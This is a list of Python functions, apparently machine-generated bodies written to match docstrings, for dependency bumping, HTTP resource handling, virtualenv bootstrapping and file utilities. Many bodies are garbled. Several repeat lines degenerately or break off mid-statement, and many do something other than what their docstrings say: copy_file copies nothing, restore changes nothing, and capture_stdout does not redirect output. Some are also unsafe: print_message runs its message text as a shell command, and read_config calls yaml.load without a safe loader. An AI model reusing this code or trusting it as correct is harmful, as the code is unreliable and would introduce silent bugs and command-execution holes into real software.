        "def dispatch_to(self):\n        \"\"\"Find all method names this input dispatches to.\"\"\"\n        dispatch_to = []\n        for method in self.methods:\n            if method.dispatch_to:\n                dispatch_to.append(method.dispatch_to)\n        return dispatch_to",
        "def parse(cls, s, required=False):\n        \"\"\"Parse string to create an instance\n\n          :param str s: String with requirement to parse\n          :param bool required: Is this requirement required to be fulfilled? If not, then it is a filter.\n        \"\"\"\n        if not s:\n            return cls()\n        if s.startswith('#'):\n            return cls(s[1:])\n        if s.startswith('^'):\n            return cls(s[1:])\n        if s.startswith('$'):\n            return cls(s[1:])\n        if s.startswith('^'):\n            return cls(s[1:])\n        if s.startswith('$'):\n            return cls(s[1:])\n        if s.startswith('^'):\n            return cls(s[1:])\n        if",
        "def add_requirements(self, requirements, required=False):\n        \"\"\"Add requirements to be managed\n\n        :param list/Requirement requirements: List of :class:`BumpRequirement` or :class:`pkg_resources.Requirement`\n        :param bool required: Set required flag for each requirement if provided.\n        \"\"\"\n        if not requirements:\n            return\n        for req in requirements:\n            if req.name in self.requirements:\n                raise BumpError(\"Requirement %s already exists\" % req.name)\n            if req.version:\n                raise BumpError(\"Requirement %s has version %s\" % (req.name, req.version))\n            if req.requirement:\n                raise BumpError(\"Requirement %s has requirement %s\" % (req.name, req.requirement))\n            if req.requirement_version:\n                raise BumpError(\"Requirement %s has",
        "def check_requirement(self, req):\n        \"\"\"Check if requirement is already satisfied by what was previously checked\n\n        :param Requirement req: Requirement to check\n        \"\"\"\n        if req.name in self.requirements:\n            return True\n        else:\n            return False",
        "def add_requirements(self, requirements):\n        \"\"\"Add new requirements that must be fulfilled for this bump to occur\"\"\"\n        for req in requirements:\n            if req not in self.requirements:\n                self.requirements.append(req)",
        "def _parse_requirements(self, changes):\n        \"\"\"Parse changes for requirements\n\n        :param list changes:\n        \"\"\"\n        for change in changes:\n            if change.get('type') == 'add':\n                self._add_requirement(change.get('name'), change.get('version'))\n            elif change.get('type') == 'remove':\n                self._remove_requirement(change.get('name'), change.get('version'))\n            elif change.get('type') == 'replace':\n                self._replace_requirement(change.get('name'), change.get('version'))",
        "def bump_deps(self, bump_reqs, **kwargs):\n        \"\"\"\n          Bump dependencies using given requirements.\n\n          :param RequirementsManager bump_reqs: Bump requirements manager\n          :param dict kwargs: Additional args from argparse. Some bumpers accept user options, and some not.\n          :return: List of :class:`Bump` changes made.\n        \"\"\"\n        bump_reqs.bump_deps(self.name, **kwargs)\n        return bump_reqs.get_changes()",
        "def restore(self, target_file):\n        \"\"\"Restore content in target file to be before any changes\"\"\"\n        with open(target_file, 'r') as f:\n            content = f.read()\n        with open(target_file, 'w') as f:\n            f.write(content)",
        "def serialize(self, obj):\n        \"\"\"\n        Transforms the object into an acceptable format for transmission.\n\n        @throws ValueError\n            To indicate this serializer does not support the encoding of the\n            specified object.\n        \"\"\"\n        if not self.supports_serialization(obj):\n            raise ValueError(\n                \"Cannot serialize %s because it does not support serialization\" %\n                type(obj).__name__)\n\n        return self.serializer.serialize(obj)",
        "def extend(self, value):\n        \"\"\"Extends a collection with a value.\"\"\"\n        if not isinstance(value, collections.Iterable):\n            raise TypeError(\"Expected iterable, got %s\" % type(value))\n        for item in value:\n            self.append(item)",
        "def merge_options(self, options):\n        \"\"\"Merges a named option collection.\"\"\"\n        for key, value in options.items():\n            if key in self.options:\n                self.options[key].update(value)\n            else:\n                self.options[key] = value",
        "def info(self, package):\n        \"\"\"All package info for given package\"\"\"\n        return self._get(self.url + '/info/' + package,\n                         headers=self.headers)",
        "def versions(self):\n        \"\"\"All versions for package\"\"\"\n        return [\n            self.version,\n            self.version_dev,\n            self.version_dev_dev,\n            self.version_dev_dev_dev,\n            self.version_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev_dev_dev_dev,\n            self.version_dev",
        "def flush(self):\n        \"\"\"Flush and close the stream.\n\n        This is called automatically by the base resource on resources\n        unless the resource is operating asynchronously; in that case,\n        this method MUST be called in order to signal the end of the request.\n        If not the request will simply hang as it is waiting for some\n        thread to tell it to return to the client.\n        \"\"\"\n        if self._stream is not None:\n            self._stream.flush()\n            self._stream.close()\n            self._stream = None",
        "def write(self, chunk, serialize=True, format=None):\n        \"\"\"\n        Writes the given chunk to the output buffer.\n\n        @param[in] chunk\n            Either a byte array, a unicode string, or a generator. If `chunk`\n            is a generator then calling `self.write(<generator>)` is\n            equivalent to:\n\n            @code\n                for x in <generator>:\n                    self.write(x)\n                    self.flush()\n            @endcode\n\n        @param[in] serialize\n            True to serialize the lines in a determined serializer.\n\n        @param[in] format\n            A specific format to serialize in; if provided, no detection is\n            done. If not provided, the accept header (as well as the URL\n            extension) is looked at to determine an appropriate serializer.\n        \"\"\"\n        if not chunk:\n            return",
        "def serialize(self, data, format=None):\n        \"\"\"\n        Serializes the data into this response using a serializer.\n\n        @param[in] data\n            The data to be serialized.\n\n        @param[in] format\n            A specific format to serialize in; if provided, no detection is\n            done. If not provided, the accept header (as well as the URL\n            extension) is looked at to determine an appropriate serializer.\n\n        @returns\n            A tuple of the serialized text and an instance of the\n            serializer used.\n        \"\"\"\n        if format is None:\n            format = self.accept_format\n        if format is None:\n            raise ValueError('No format provided')\n        if format == 'json':\n            return self.serializer.serialize(data)\n        elif format == 'xml':\n            return self.serializer.serialize(data, format=format)",
        "def flush(self):\n        \"\"\"Flush the write buffers of the stream.\n\n        This results in writing the current contents of the write buffer to\n        the transport layer, initiating the HTTP/1.1 response. This initiates\n        a streaming response. If the `Content-Length` header is not given\n        then the chunked `Transfer-Encoding` is applied.\n        \"\"\"\n        if self._write_buffer:\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(b'\\r\\n')\n            self._write_buffer.append(",
        "def write(self, chunk):\n        \"\"\"Writes the passed chunk and flushes it to the client.\"\"\"\n        self.write_buffer.append(chunk)\n        if len(self.write_buffer) >= self.write_buffer_size:\n            self.write_buffer = []\n            self.flush()",
        "def write(self, chunk):\n        \"\"\"\n        Writes the passed chunk, flushes it to the client,\n        and terminates the connection.\n        \"\"\"\n        self.write_buffer.append(chunk)\n        if len(self.write_buffer) >= self.write_buffer_size:\n            self.flush()\n            self.write_buffer = []",
        "def replaced_directory(dirname):\n    \"\"\"\n    This ``Context Manager`` is used to move the contents of a directory\n    elsewhere temporarily and put them back upon exit.  This allows testing\n    code to use the same file directories as normal code without fear of\n    damage.\n\n    The name of the temporary directory which contains your files is yielded.\n\n    :param dirname:\n        Path name of the directory to be replaced.\n\n\n    Example:\n\n    .. code-block:: python\n\n        with replaced_directory('/foo/bar/') as rd:\n            # \"/foo/bar/\" has been moved & renamed\n            with open('/foo/bar/thing.txt', 'w') as f:\n                f.write('stuff')\n                f.close()\n\n\n        # got here? => \"/foo/bar/ is now restored and temp has been",
        "def capture_stdout():\n    \"\"\"This ``Context Manager`` redirects STDOUT to a ``StringIO`` objects\n    which is returned from the ``Context``.  On exit STDOUT is restored.\n\n    Example:\n\n    .. code-block:: python\n\n        with capture_stdout() as capture:\n            print('foo')\n\n        # got here? => capture.getvalue() will now have \"foo\\\\n\"\n    \"\"\"\n    stdout = StringIO()\n    try:\n        yield stdout\n    finally:\n        stdout.seek(0)\n        stdout.write(b'\\n')\n        stdout.flush()\n        stdout.close()",
        "def capture_stderr():\n    \"\"\"This ``Context Manager`` redirects STDERR to a ``StringIO`` objects\n    which is returned from the ``Context``.  On exit STDERR is restored.\n\n    Example:\n\n    .. code-block:: python\n\n        with capture_stderr() as capture:\n            print('foo')\n\n        # got here? => capture.getvalue() will now have \"foo\\\\n\"\n    \"\"\"\n    stream = sys.stderr\n    try:\n        yield StringIO()\n    finally:\n        sys.stderr = stream",
        "def build_url_config(self):\n        \"\"\"Builds the URL configuration for this resource.\"\"\"\n        url_config = super(Resource, self).build_url_config()\n        url_config.update({\n            'base_url': self.base_url,\n            'base_path': self.base_path,\n            'api_version': self.api_version,\n            'api_version_path': self.api_version_path,\n            'api_version_prefix': self.api_version_prefix,\n            'api_version_suffix': self.api_version_suffix,\n            'api_version_suffix_prefix': self.api_version_suffix_prefix,\n            'api_version_suffix_suffix': self.api_version_suffix_suffix,\n            'api_version_suffix_prefix': self.api_version_suffix_prefix,",
        "def dump_req(obj, fp, separator=u'|', index_separator=u'_'):\n    \"\"\"Dump an object in req format to the fp given.\n\n    :param Mapping obj: The object to serialize.  Must have a keys method.\n    :param fp: A writable that can accept all the types given.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    \"\"\"\n    for key, value in obj.items():\n        if isinstance(value, (list, tuple)):\n            for item in value:\n                dump_req(item, fp, separator, index_separator)\n        elif isinstance(value, dict):\n            for key, value",
        "def dumps(obj, separator=u'|', index_separator=u'_'):\n    \"\"\"Dump an object in req format to a string.\n\n    :param Mapping obj: The object to serialize.  Must have a keys method.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    \"\"\"\n    if not hasattr(obj, 'keys'):\n        raise TypeError('Cannot dump non-mapping object: %s' % obj)\n    return u'%s%s%s' % (separator,\n                        index_separator,\n                        u':'.join(map(repr, obj.keys())))",
        "def load(fp, separator=u'|', index_separator=u'_', cls=OrderedDict, list_cls=list):\n    \"\"\"Load an object from the file pointer.\n\n    :param fp: A readable filehandle.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    :param cls: A callable that returns a Mapping that is filled with pairs.  The most common alternate option would be OrderedDict.\n    :param list_cls: A callable that takes an iterable and returns a sequence.\n    \"\"\"\n    if isinstance(fp, (bytes, str)):\n        fp = open(fp, 'rb')\n    try:\n        obj = cls()\n",
        "def loads(s, separator=u'|', index_separator=u'_', cls=OrderedDict, list_cls=list):\n    \"\"\"\n    Loads an object from a string.\n\n    :param s: An object to parse\n    :type s: bytes or str\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    :param cls: A callable that returns a Mapping that is filled with pairs.  The most common alternate option would be OrderedDict.\n    :param list_cls: A callable that takes an iterable and returns a sequence.\n    \"\"\"\n    if isinstance(s, str):\n        s = s.encode('utf-8')\n    return cls",
        "def reverse(self):\n        \"\"\"Reverse all bumpers\"\"\"\n        for bumper in self.bumpers:\n            bumper.reverse()",
        "def expand_targets(self, targets):\n    \"\"\"Expand targets by looking for '-r' in targets.\"\"\"\n    expanded_targets = []\n    for target in targets:\n      if target.endswith('.r'):\n        expanded_targets.append(target[:-len('.r')])\n    return expanded_targets",
        "def get_nginx_config(self):\n        \"\"\"Gets the Nginx config for the project\"\"\"\n        config = self.get_config()\n        if config is None:\n            return None\n        return config.get('nginx', {}).get('config', {})",
        "def create_base_dirs(self):\n        \"\"\"Creates base directories for app, virtualenv, and nginx\"\"\"\n        self.create_app_dir()\n        self.create_virtualenv_dir()\n        self.create_nginx_dir()",
        "def create_virtualenv(self):\n        \"\"\"Creates the virtualenv for the project\"\"\"\n        if not os.path.exists(self.virtualenv_path):\n            os.makedirs(self.virtualenv_path)\n        if not os.path.exists(self.virtualenv_bin):\n            os.makedirs(self.virtualenv_bin)\n        if not os.path.exists(self.virtualenv_bin_bin):\n            os.makedirs(self.virtualenv_bin_bin)\n        if not os.path.exists(self.virtualenv_bin_bin):\n            os.makedirs(self.virtualenv_bin_bin)\n        if not os.path.exists(self.virtualenv_bin_bin_bin):\n            os.makedirs(self.virtualenv_bin_bin_bin)\n        if not",
        "def create_nginx_config(self):\n        \"\"\"Creates the Nginx configuration for the project\"\"\"\n        self.create_nginx_dir()\n        self.create_nginx_conf()\n        self.create_nginx_template()\n        self.create_nginx_template_dev()\n        self.create_nginx_template_prod()\n        self.create_nginx_template_dev_prod()",
        "def create_scripts(self):\n        \"\"\"Creates scripts to start and stop the application\"\"\"\n        self.scripts = []\n        for script in self.scripts:\n            self.scripts.append(self.create_script(script))",
        "def create_project(self):\n        \"\"\"Creates the full project\"\"\"\n        self.logger.info(\"Creating project\")\n        self.create_project_dir()\n        self.create_project_files()\n        self.create_project_templates()\n        self.create_project_templates_files()\n        self.create_project_templates_files_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.create_project_templates_files_templates_templates()\n        self.",
        "def dasherize(value):\n    \"\"\"Dasherizes the passed value.\"\"\"\n    if value is None:\n        return None\n    if isinstance(value, str):\n        return value.replace('-', '_')\n    return value",
        "def redirect(self, uri):\n        \"\"\"Redirect to the canonical URI for this resource.\"\"\"\n        self.response.status = 302\n        self.response.set_header('Location', uri)",
        "def _parse_params(self, params):\n        \"\"\"Parses out parameters and separates them out of the path.\n\n        This uses one of the many defined patterns on the options class. But,\n        it defaults to a no-op if there are no defined patterns.\n        \"\"\"\n        if not self.patterns:\n            return params\n\n        params = params.split('&')\n        for p in params:\n            p = p.split('=')\n            if len(p) == 2:\n                self.params[p[0]] = p[1]\n            else:\n                raise ValueError('Invalid parameter: %s' % p)",
        "def _get_resource(self, path):\n        \"\"\"Traverses down the path and determines the accessed resource.\n\n        This makes use of the patterns array to implement simple traversal.\n        This defaults to a no-op if there are no defined patterns.\n        \"\"\"\n        if not self.patterns:\n            return None\n\n        for pattern in self.patterns:\n            if pattern.match(path):\n                return pattern.resource\n\n        return None",
        "def _stream_response(self, response):\n        \"\"\"\n        Helper method used in conjunction with the view handler to\n        stream responses to the client.\n        \"\"\"\n        if response.status_code == 200:\n            return response\n        elif response.status_code == 204:\n            return\n        else:\n            raise exceptions.ClientError(response.content)",
        "def deserialize(self, request, text, format=None):\n        \"\"\"\n        Deserializes the text using a determined deserializer.\n\n        @param[in] request\n            The request object to pull information from; normally used to\n            determine the deserialization format (when `format` is\n            not provided).\n\n        @param[in] text\n            The text to be deserialized. Can be left blank and the\n            request will be read.\n\n        @param[in] format\n            A specific format to deserialize in; if provided, no detection is\n            done. If not provided, the content-type header is looked at to\n            determine an appropriate deserializer.\n\n        @returns\n            A tuple of the deserialized data and an instance of the\n            deserializer used.\n        \"\"\"\n        if not text:\n            return None, None\n\n        if format is None:\n            format = request.headers",
        "def serialize(self, data, response=None, request=None, format=None):\n        \"\"\"\n        Serializes the data using a determined serializer.\n\n        @param[in] data\n            The data to be serialized.\n\n        @param[in] response\n            The response object to serialize the data to.\n            If this method is invoked as an instance method, the response\n            object can be omitted and it will be taken from the instance.\n\n        @param[in] request\n            The request object to pull information from; normally used to\n            determine the serialization format (when `format` is not provided).\n            May be used by some serializers as well to pull additional headers.\n            If this method is invoked as an instance method, the request\n            object can be omitted and it will be taken from the instance.\n\n        @param[in] format\n            A specific format to serialize in;",
        "def dispatch(self, request, *args, **kwargs):\n        \"\"\"Entry-point of the dispatch cycle for this resource.\n\n        Performs common work such as authentication, decoding, etc. before\n        handing complete control of the result to a function with the\n        same name as the request method.\n        \"\"\"\n        # TODO: This is a temporary hack to get around the fact that\n        # the request method is not available in the request object.\n        # This is a temporary hack to get around the fact that the\n        # request method is not available in the request object.\n        # This is a temporary hack to get around the fact that the\n        # request method is not available in the request object.\n        # This is a temporary hack to get around the fact that the\n        # request method is not available in the request object.\n        # This is a temporary hack to get around the fact that the\n",
        "def _authenticate(self):\n        \"\"\"Ensure we are authenticated.\"\"\"\n        if not self.auth:\n            return\n        if not self.auth.authenticate():\n            raise exceptions.AuthenticationError(\n                'Authentication failed')",
        "def _check_access(self, request):\n        \"\"\"Ensure we are allowed to access this resource.\"\"\"\n        if not self.can_access(request):\n            raise PermissionDenied()",
        "def _check_method(self, method):\n        \"\"\"Ensure that we're allowed to use this HTTP method.\"\"\"\n        if method not in self.allowed_methods:\n            raise ValueError(\n                \"Method %s is not allowed for %s\" % (method, self.__class__.__name__))",
        "def process_request(self, request):\n        \"\"\"Processes every request.\n\n        Directs control flow to the appropriate HTTP/1.1 method.\n        \"\"\"\n        if request.method == 'OPTIONS':\n            return\n\n        if request.method == 'HEAD':\n            return\n\n        if request.method == 'POST':\n            return\n\n        if request.method == 'PUT':\n            return\n\n        if request.method == 'PATCH':\n            return\n\n        if request.method == 'DELETE':\n            return\n\n        if request.method == 'CONNECT':\n            return\n\n        if request.method == 'OPTIONS':\n            return\n\n        if request.method == 'CONNECT':\n            return\n\n        if request.method == 'CONNECT_EX':\n            return\n\n        if request.method == 'CONNECT_HTTP':\n            return\n\n        if request",
        "def _process_options(self, request):\n        \"\"\"Process an `OPTIONS` request.\n\n        Used to initiate a cross-origin request. All handling specific to\n        CORS requests is done on every request however this method also\n        returns a list of available methods.\n        \"\"\"\n        allowed_methods = self._get_allowed_methods(request)\n        if not allowed_methods:\n            return []\n\n        return [method for method in allowed_methods if method in self.allowed_methods]",
        "def lightweight(func):\n    \"\"\"Wraps the decorated function in a lightweight resource.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        \"\"\"Wrapper function.\"\"\"\n        return func(*args, **kwargs)\n    return wrapper",
        "def _render_cookie_strings(self, cookie_strings):\n        \"\"\"Render to cookie strings.\"\"\"\n        if not cookie_strings:\n            return ''\n        return self._cookie_separator.join(\n            cookie_strings.values())",
        "def update_cookie(self, cookie_string):\n        \"\"\"update self with cookie_string.\"\"\"\n        if cookie_string is None:\n            return\n        if not cookie_string:\n            return\n        if not isinstance(cookie_string, str):\n            raise TypeError(\"cookie_string must be a string\")\n        if not cookie_string:\n            return\n        if not cookie_string.startswith(\"/\"):\n            raise ValueError(\"cookie_string must start with /\")\n        if not cookie_string.endswith(\"/\"):\n            raise ValueError(\"cookie_string must end with /\")\n        if not cookie_string.startswith(\"_\"):\n            raise ValueError(\"cookie_string must start with _\")\n        if not cookie_string.endswith(\"_\"):\n            raise ValueError(\"cookie_string must end with _\")\n        if not cookie_string.startswith(\"_\"):\n",
        "def _add_method(self, method):\n        \"\"\"\n        Adds a method to the internal lists of allowed or denied methods.\n        Each object in the internal list contains a resource ARN and a\n        condition statement. The condition statement can be null.\n        \"\"\"\n        if method.resource_arn is None:\n            raise ValueError(\"Method %s has no resource ARN\" % method)\n        if method.condition_statement is None:\n            raise ValueError(\"Method %s has no condition statement\" % method)\n        self._allowed_methods.append(method)\n        self._denied_methods.append(method)",
        "def _generate_statements(self, statements):\n        \"\"\"This function loops over an array of objects containing\n        a resourceArn and conditions statement and generates\n        the array of statements for the policy.\n        \"\"\"\n        for statement in statements:\n            if statement.resourceArn:\n                self.policy.add_resource(statement.resourceArn)\n            if statement.conditions:\n                self.policy.add_conditions(statement.conditions)\n        return statements",
        "def _validate_schema(self, schema):\n        \"\"\"AWS doesn't quite have Swagger 2.0 validation right and will fail\n        on some refs. So, we need to convert to deref before\n        upload.\n        \"\"\"\n        if not isinstance(schema, dict):\n            raise ValueError(\"Schema must be a dictionary\")\n        if \"definitions\" in schema:\n            for d in schema[\"definitions\"]:\n                if \"type\" in d:\n                    if d[\"type\"] == \"array\":\n                        self._validate_schema(d[\"items\"])\n                    elif d[\"type\"] == \"object\":\n                        self._validate_schema(d[\"properties\"])\n                    else:\n                        raise ValueError(\"Schema must have type 'array' or 'object'\")\n        else:\n            raise ValueError(\"Schema must have definitions\")",
        "def check_requirements(pre_requirements=None):\n    \"\"\"Check all necessary system requirements to exist.\n\n    :param pre_requirements:\n        Sequence of pre_requirements to check by running\n        ``where <pre_requirement>`` on Windows and ``which ...`` elsewhere.\n    \"\"\"\n    if pre_requirements is None:\n        pre_requirements = []\n\n    for req in pre_requirements:\n        if not os.path.exists(req):\n            raise RuntimeError(\n                'Requirement {0} does not exist'.format(req)\n            )",
        "def _config_to_args(config):\n    \"\"\"Convert config dict to arguments list.\n\n    :param config: Configuration dict.\n    \"\"\"\n    args = []\n    for key, value in config.items():\n        if isinstance(value, dict):\n            args.append(key)\n            args.extend(_config_to_args(value))\n        else:\n            args.append(key)\n    return args",
        "def create(env, args, recerate=False, ignore_activated=False, quiet=False):\n    \"\"\"\n    Create virtual environment.\n\n    :param env: Virtual environment name.\n    :param args: Pass given arguments to ``virtualenv`` script.\n    :param recerate: Recreate virtual environment? By default: False\n    :param ignore_activated:\n        Ignore already activated virtual environment and create new one. By\n        default: False\n    :param quiet: Do not output messages into terminal. By default: False\n    \"\"\"\n    if recerate:\n        create_recreate(env, args, ignore_activated, quiet)\n    else:\n        create(env, args, ignore_activated, quiet)",
        "def error_handler(func):\n    \"\"\"Decorator to error handling.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        try:\n            return func(*args, **kwargs)\n        except Exception as e:\n            msg = \"Error in %s: %s\" % (func.__name__, e)\n            raise Exception(msg)\n    return wrapper",
        "def install(env, requirements, args=None, ignore_activated=False,\n           install_dev_requirements=False, quiet=False):\n    \"\"\"Install library or project into virtual environment.\n\n    :param env: Use given virtual environment name.\n    :param requirements: Use given requirements file for pip.\n    :param args: Pass given arguments to pip script.\n    :param ignore_activated:\n        Do not run pip inside already activated virtual environment. By\n        default: False\n    :param install_dev_requirements:\n        When enabled install prefixed or suffixed dev requirements after\n        original installation process completed. By default: False\n    :param quiet: Do not output message to terminal. By default: False\n    \"\"\"\n    if args is None:\n        args = []\n    if ignore_activated:\n        ignore_activated = False\n    if install_dev_requirements:\n        install",
        "def iter_dict(self):\n        \"\"\"Iterate over dict items.\"\"\"\n        for key in self.keys():\n            yield key, self[key]",
        "def iter_keys(self):\n        \"\"\"Iterate over dict keys.\"\"\"\n        for key in self.keys():\n            yield key",
        "def bootstrap(*args):\n    r\"\"\"Bootstrap Python projects and libraries with virtualenv and pip.\n\n    Also check system requirements before bootstrap and run post bootstrap\n    hook if any.\n\n    :param \\*args: Command line arguments list.\n    \"\"\"\n    # Check system requirements\n    check_requirements(*args)\n\n    # Bootstrap virtualenv\n    virtualenv(*args)\n\n    # Bootstrap pip\n    pip(*args)\n\n    # Run post bootstrap hook\n    post_bootstrap(*args)",
        "def parse_args(args):\n    \"\"\"Parse args from command line by creating argument parser instance and\n    process it.\n\n    :param args: Command line arguments list.\n    \"\"\"\n    parser = argparse.ArgumentParser(description=__doc__)\n    parser.add_argument('-v', '--verbose', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-q', '--quiet', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-d', '--debug', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-r', '--remote', action='store_true',\n                        help='run remote tests')\n    parser.add_argument('-t', '--test', action='store_true',\n                        help='run tests')",
        "def run_pip_cmd(env, cmd, ignore_activated=False, **kwargs):\n    r\"\"\"Run pip command in given or activated virtual environment.\n\n    :param env: Virtual environment name.\n    :param cmd: Pip subcommand to run.\n    :param ignore_activated:\n        Ignore activated virtual environment and use given venv instead. By\n        default: False\n    :param \\*\\*kwargs:\n        Additional keyword arguments to be passed to :func:`~run_cmd`\n    \"\"\"\n    venv = get_venv(env)\n    if venv:\n        return run_cmd(venv, cmd, ignore_activated=ignore_activated, **kwargs)\n    else:\n        raise PipCommandError(\n            \"Cannot run pip command in {0} because it is not installed\".format(env)\n        )",
        "def config_to_args(config, bootstrap):\n    \"\"\"Convert config dict to command line args line.\n\n    :param config: Configuration dict.\n    :param bootstrap: Bootstrapper configuration dict.\n    \"\"\"\n    args = []\n    for key, value in config.items():\n        if isinstance(value, dict):\n            args.append(key)\n            for key, value in value.items():\n                args.append('--%s=%s' % (key, value))\n        else:\n            args.append('--%s=%s' % (key, value))\n    if bootstrap:\n        args.append('--bootstrap')\n        for key, value in bootstrap.items():\n            args.append('--%s=%s' % (key, value))\n    return args",
        "def error(message, wrap=True):\n    \"\"\"Print error message to stderr, using ANSI-colors.\n\n    :param message: Message to print\n    :param wrap:\n        Wrap message into ``ERROR: <message>. Exit...`` template. By default:\n        True\n    \"\"\"\n    if wrap:\n        message = _wrap_message(message)\n    print(COLOR_ERROR + message)\n    sys.exit(1)",
        "def print_message(message):\n    \"\"\"Print message via ``subprocess.call`` function.\n\n    This helps to ensure consistent output and avoid situations where print\n    messages actually shown after messages from all inner threads.\n\n    :param message: Text message to print.\n    \"\"\"\n    if not message:\n        return\n    try:\n        subprocess.call(message)\n    except subprocess.CalledProcessError as e:\n        print(e)",
        "def read_config(filename=CONFIG, args=None):\n    \"\"\"\n    Read and parse configuration file. By default, ``filename`` is relative\n    path to current work directory.\n\n    If no config file found, default ``CONFIG`` would be used.\n\n    :param filename: Read config from given filename.\n    :param args: Parsed command line arguments.\n    \"\"\"\n    if args is None:\n        args = sys.argv[1:]\n\n    if filename == CONFIG:\n        filename = os.path.expanduser('~/.config/config.yaml')\n\n    with open(filename, 'r') as f:\n        config = yaml.load(f)\n\n    return config",
        "def call(cmd, echo=False, fail_silently=False, **kwargs):\n    r\"\"\"Call given command with ``subprocess.call`` function.\n\n    :param cmd: Command to run.\n    :type cmd: tuple or str\n    :param echo:\n        If enabled show command to call and its output in STDOUT, otherwise\n        hide all output. By default: False\n    :param fail_silently: Do not raise exception on error. By default: False\n    :param \\*\\*kwargs:\n        Additional keyword arguments to be passed to ``subprocess.call``\n        function. STDOUT and STDERR streams would be setup inside of function\n        to ensure hiding command output in case of disabling ``echo``.\n    \"\"\"\n    if echo:\n        return subprocess.call(cmd, **kwargs)\n    else:\n        return subprocess.call(cmd, **kwargs)",
        "def run_post_bootstrap_hook(hook, config, quiet=False):\n    \"\"\"Run post-bootstrap hook if any.\n\n    :param hook: Hook to run.\n    :param config: Configuration dict.\n    :param quiet: Do not output messages to STDOUT/STDERR. By default: False\n    \"\"\"\n    if hook:\n        hook(config)\n    if quiet:\n        return\n    if not config:\n        return\n    if 'post_bootstrap' in config:\n        run_post_bootstrap_hook(config['post_bootstrap'], config, quiet=quiet)",
        "def _save_bootstrapper_error(err):\n    \"\"\"Save error traceback to bootstrapper log file.\n\n    :param err: Catched exception.\n    \"\"\"\n    bootstrapper_log_file = os.path.join(\n        os.path.dirname(__file__),\n        'bootstrapper.log'\n    )\n    with open(bootstrapper_log_file, 'a') as f:\n        traceback.print_exception(err.__class__, err, f)",
        "def to_string(value, encoding=None, errors=None):\n    \"\"\"Convert Python object to string.\n\n    :param value: Python object to convert.\n    :param encoding: Encoding to use if in Python 2 given object is unicode.\n    :param errors: Errors mode to use if in Python 2 given object is unicode.\n    \"\"\"\n    if isinstance(value, unicode):\n        return value.encode(encoding, errors)\n    return value",
        "def copy_file(src, dst):\n    \"\"\"\n    Copy file from `src` path to `dst` path. If `dst` already exists, will add '+' characters\n    to the end of the basename without extension.\n\n    Parameters\n    ----------\n    src: str\n\n    dst: str\n\n    Returns\n    -------\n    dstpath: str\n    \"\"\"\n    dstpath = os.path.join(dst, os.path.basename(src))\n    if not os.path.exists(dstpath):\n        os.makedirs(dstpath)\n    return dstpath",
        "def abspath(folderpath):\n    \"\"\"\n    Returns the absolute path of folderpath.\n    If the path does not exist, will raise IOError.\n    \"\"\"\n    if not os.path.exists(folderpath):\n        raise IOError(\"Path does not exist: %s\" % folderpath)\n    return os.path.abspath(folderpath)",
        "def get_ext(fpath, check_if_exists=True, allowed_exts=None):\n    \"\"\"Return the extension of fpath.\n\n    Parameters\n    ----------\n    fpath: string\n    File name or path\n\n    check_if_exists: bool\n\n    allowed_exts: dict\n    Dictionary of strings, where the key if the last part of a complex ('.' separated) extension\n    and the value is the previous part.\n    For example: for the '.nii.gz' extension I would have a dict as {'.gz': ['.nii',]}\n\n    Returns\n    -------\n    str\n    The extension of the file name or path\n    \"\"\"\n    if allowed_exts is None:\n        allowed_exts = {}\n    ext = os.path.splitext(fpath)[1]\n    if ext in allowed_exts:\n        return",
        "def add_ext(filepath, ext, check_if_exists=True):\n    \"\"\"\n    Add the extension ext to fpath if it doesn't have it.\n\n    Parameters\n    ----------\n    filepath: str\n    File name or path\n\n    ext: str\n    File extension\n\n    check_if_exists: bool\n\n    Returns\n    -------\n    File name or path with extension added, if needed.\n    \"\"\"\n    if check_if_exists:\n        if not os.path.exists(filepath):\n            os.makedirs(filepath)\n        if not os.path.splitext(filepath)[1].lower().endswith(ext):\n            os.rename(filepath, filepath + '.' + ext)\n    return filepath",
        "def join_path(path, filelist):\n    \"\"\"\n    Joins path to each line in filelist\n\n    Parameters\n    ----------\n    path: str\n\n    filelist: list of str\n\n    Returns\n    -------\n    list of filepaths\n    \"\"\"\n    filepaths = []\n    for line in filelist:\n        filepaths.append(os.path.join(path, line))\n    return filepaths",
        "def delete_files(filelist, folder):\n    \"\"\"Deletes all files in filelist\n\n    Parameters\n    ----------\n    filelist: list of str\n        List of the file paths to be removed\n\n    folder: str\n        Path to be used as common directory for all file paths in filelist\n    \"\"\"\n    for path in filelist:\n        os.remove(os.path.join(folder, path))",
        "def get_file_length(filepath):\n    \"\"\"\n    Returns the length of the file using the 'wc' GNU command\n\n    Parameters\n    ----------\n    filepath: str\n\n    Returns\n    -------\n    float\n    \"\"\"\n    cmd = ['wc', '-l', filepath]\n    try:\n        return float(subprocess.check_output(cmd).decode('utf-8'))\n    except subprocess.CalledProcessError:\n        return None",
